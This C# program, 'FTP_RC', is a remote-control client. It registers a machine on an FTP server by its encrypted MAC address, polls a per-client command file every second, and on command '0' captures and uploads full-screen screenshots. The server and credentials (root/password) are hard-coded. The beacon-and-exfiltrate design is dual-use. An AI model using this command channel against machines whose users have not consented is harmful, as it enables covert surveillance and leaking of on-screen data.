// MIT License
// 
// Copyright (c) 2017 Noah Allen
// 
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
// 
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
// 
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Net.NetworkInformation;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;

namespace FTP_RC
{
    class Program
    {
        static void Main(string[] args)
        {
            // Retrieve MAC Address from first available NIC card. Returns String.Empty if a valid
            // MAC address cannot be found.
            // Perhaps a separate method of identifying the client should be used,
            // either altogether, or as an alternate.
            // Future versions of this program should address this issue.
            string macAddress = ComputerInfo.GetMacAddress();
            // The program terminates if it was unable to obtain a MAC address
            if (macAddress.Length == 12)
            {
                // Create new FTP client object, passing the server, username, and password to the constructor
                FTPClient ftpClient = new FTPClient("127.0.0.1", "root", "password");
                // If the client is able to establish a connection to the FTP Server and log in
                if (ftpClient.IsLoggedIn())
                {
                    // Create object RSA encryption
                    RSAEncryption rsa = new RSAEncryption();
                    // Check if there is an entry in the computer's user container which is the MAC address
                    if(!rsa.LoadFromContainer(macAddress))
                    {
                        // Add new MAC address entry to the user container store the RSA public and private key information
                        // NOTE: Storing the private key here is not safe. In the future only the public key will be stored.
                        rsa.SaveInContainer(macAddress);
                    }
                    // Stores the current offset of the command file
                    long cmdPosition = 0;
                    // Flag indicating if this is the first time the client has connected to this Ftp Server
                    bool hasConnectedBefore = false;
                    // Attempt to download the file "clients.txt" from the Ftp Server
                    // NOTE: The "DownloadText" method returns null if the file does not exist
                    StreamReader textReader = ftpClient.DownloadText("clients.txt");
                    // If the file exists on the server
                    if (textReader != null)
                    {
                        // Loop until the client has been found or the end of the file is reached
                        while (!hasConnectedBefore && !textReader.EndOfStream)
                        {
                            // Grab the current line of text from the reader
                            string currentLine = textReader.ReadLine();
                            // If the current line is the client's encrypted MAC address
                            if (rsa.DecryptText(currentLine) == macAddress)
                            {
                                // Display message informing the user of their Unencrypted and Encrypted MAC address values
                                Console.WriteLine("Found MAC " + rsa.DecryptText(currentLine) + ", ENCRYPTED: " + currentLine);
                                // Set flag that this is not the client's first time connecting to the Ftp Server
                                hasConnectedBefore = true;
                            }
                        }
                        // Close the reader to free its allocated resources
                        textReader.Close();
                        // Free the resources held by the response
                        ftpClient.Response.Close();
                    }
                    // If this is the first time the client has connected to this Ftp Server
                    if (!hasConnectedBefore)
                    {
                        // Add this client to the list of existing clients
                        // NOTE: The "UploadText" method appends pre-existing files.
                        //       The RSA public key should used instead of the MAC. This is to be updateded in a future version.
                        ftpClient.UploadText(rsa.EncryptText(macAddress) + Environment.NewLine, "clients.txt");
                    }
                    // Infinite loop
                    while (true)
                    {
                        // Sleep for 1 second
                        Thread.Sleep(1000);
                        // Display message informing that the loop in running another iteration
                        Console.WriteLine("Sleeping");
                        // Attempt to download the file <client MAC>"CMD.txt" from the Ftp Server
                        // NOTE: The "DownloadText" method returns null if the file does not exist
                        textReader = ftpClient.DownloadText(macAddress + "CMD.txt", cmdPosition);
                        // If the command file was found
                        if (textReader != null)
                        {

                            // Loop until the end of the file is reached
                            while (!textReader.EndOfStream)
                            {
                                // Grab the current line of text from the reader
                                string command = textReader.ReadLine();
                                // Set the offset of the command file to where the next command begins
                                // NOTE: Environment.NewLine.Length works for windows, but changing
                                //       the text file with Linux or Mac is untested and is probably not
                                //       the same, hence breaking this. I believe Unix based OS's only use 
                                //       the "\n" line feed for newlines, while windows uses  "\r\n"
                                //       carriage return AND line feed for newlines. This needs to be tested.
                                cmdPosition += command.Length + Environment.NewLine.Length;
                                // "0" indicates to take a screenshot and upload it to the Ftp Server.
                                if (command == "0")
                                {
                                    // The filename for the screenshot is set to <client MAC><timestamp>".jpg"
                                    // Capture the screenshot and upload it to the Ftp server with a unique filename.
                                    // The "CaptureScreen" method is set to save the image in the JPEG image format.
                                    // NOTE: The "CaptureScreen" captures the screenshot from all displays
                                    //       (contains multiple monitor support). The timestamp has its precision set
                                    //       to the hundredths of a second mark, so separate screenshots taken within 
                                    //       the same hundredth of a second will overwrite each other.
                                    ftpClient.UploadMemoryStream(Screenshot.CaptureScreen(), macAddress + DateTime.Now.ToString("yyyyMMddHHmmssff") + ".jpg");
                                }
                            }
                            // Close the reader to free its allocated resources
                            textReader.Close();
                            // Free the resources held by the response
                            ftpClient.Response.Close();
                        }
                    }
                }
                else
                {
                    // Display message informing the user that there was a problem connecting to the FTP Server
                    Console.WriteLine("Unable to connect to FTP Server.");
                }
            }
            else
            {
                // Display message informing the user that the program was unable to retrieve a MAC Address
                Console.WriteLine("Unable to retrieve MAC Address.");
            }
            Console.ReadLine();
        }
    }
}
